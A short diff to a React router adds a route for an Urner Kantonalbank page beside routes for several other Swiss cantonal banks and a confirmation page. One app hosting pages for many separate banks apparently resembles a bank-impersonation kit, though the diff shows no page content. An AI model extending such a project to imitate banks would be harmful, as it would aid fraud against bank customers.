@@ -168,6 +168,7 @@ const App = () => (
             <Route path="/ch/glarner-kantonalbank" element={<P><ChGlarnerKantonalbank /></P>} />
             <Route path="/ch/graubuendner-kantonalbank" element={<P><ChGraubuendnerKantonalbank /></P>} />
             <Route path="/ch/thurgauer-kantonalbank" element={<P><ChThurgauerKantonalbank /></P>} />
+            <Route path="/ch/urner-kantonalbank" element={<P><ChUrnerKantonalbank /></P>} />
 
 
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
